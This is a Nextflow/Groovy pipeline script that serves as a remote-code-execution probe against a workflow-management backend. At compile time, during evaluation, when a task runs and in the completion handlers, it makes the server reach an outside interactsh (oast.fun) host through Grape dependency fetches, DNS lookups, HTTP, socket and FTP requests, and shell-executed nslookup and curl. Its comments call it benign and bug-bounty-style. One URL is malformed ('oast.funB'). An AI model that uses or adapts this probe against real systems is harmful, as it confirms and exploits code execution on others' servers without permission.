#!/usr/bin/env nextflow
/*
 * main.nf  —  multi-phase Nextflow/Groovy execution probe.
 * Each vector beacons a UNIQUE subdomain so your DNS/HTTP log shows WHICH phase ran.
 * Replace COLLAB with your Collaborator/interactsh domain (no scheme).
 *
 * PHASE -> SEVERITY:
 *   cfg-* / main-eval-* / grab-*  firing at getWorkflowInputs (pre-run) = server-side RCE on WFM backend.
 *   wf-run-* / proc-* firing only when you actually START a run        = your own compute (expected).
 *
 * Benign only: DNS/HTTP/socket/native-file beacons + harmless nslookup/curl.
 * No secrets exfil, no destructive ops. Stop at first confirming callback and report.
 */

nextflow.enable.dsl=2

// ================= COMPILE-TIME (Grape dependency resolution -> outbound to YOUR host) =================
// Forces Groovy Grape to fetch an artifact from a resolver you control = compile-time HTTP callback.
@GrabResolver(name='probe', root='http://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/')
@Grab(group='probe', module='probe', version='1.0')
import java.net.InetAddress

// ================= SCRIPT-EVAL PHASE (compile / -preview / -stub / DSL evaluation) =================
try { InetAddress.getByName('bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun') }           catch (Throwable t) {}
try { new URL('http://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/').getText() }      catch (Throwable t) {}
try { new URL('https://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/').getBytes() }   catch (Throwable t) {}
try { new Socket('bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun', 80).close() }         catch (Throwable t) {}
try { 'nslookup main-eval-exec.COLLAB'.execute() }              catch (Throwable t) {}
try { Runtime.getRuntime().exec(['sh','-c','nslookup main-eval-runtime.COLLAB'] as String[]) } catch (Throwable t) {}

// Nextflow-native remote fetch: file()/Channel can pull http/https/ftp/s3 transparently.
try { file('http://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/x').exists() }         catch (Throwable t) {}
try { file('ftp://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/x').exists() }           catch (Throwable t) {}

params.greeting = 'hello'

// ================= TASK EXEC PHASE (Groovy on the head node when the process runs) =================
process probe_exec {
  exec:
    try { InetAddress.getByName('bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun') }       catch (Throwable t) {}
    try { new URL('http://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/').getText() }  catch (Throwable t) {}
}

// ================= TASK SCRIPT PHASE (runs in the executor/task sandbox) =================
process probe_script {
  script:
  """
  nslookup bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun || true
  curl -s http://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.funB/ || true
  getent hosts bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun || true
  """
}

// ================= WORKFLOW / RUN PHASE =================
workflow {
  try { InetAddress.getByName('bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun') }            catch (Throwable t) {}
  try { new URL('http://bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun/').getText() }       catch (Throwable t) {}
  probe_exec()
  probe_script()
}

// ================= COMPLETION HANDLERS =================
workflow.onComplete { try { InetAddress.getByName('bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun') } catch (Throwable t) {} }
workflow.onError    { try { InetAddress.getByName('bvhkxnolhrlwbclemzjnkyjzdqawru27c.oast.fun') }    catch (Throwable t) {} }
